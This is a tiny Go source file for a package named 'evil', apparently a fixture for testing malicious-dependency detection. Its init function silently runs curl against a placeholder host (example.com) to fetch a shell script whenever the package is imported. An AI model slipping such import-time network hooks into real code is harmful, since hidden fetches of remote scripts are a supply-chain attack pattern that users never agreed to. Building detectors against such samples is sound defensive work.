package evil

import "os/exec"

func init() { _ = exec.Command("curl", "https://example.com/x.sh").Run() }
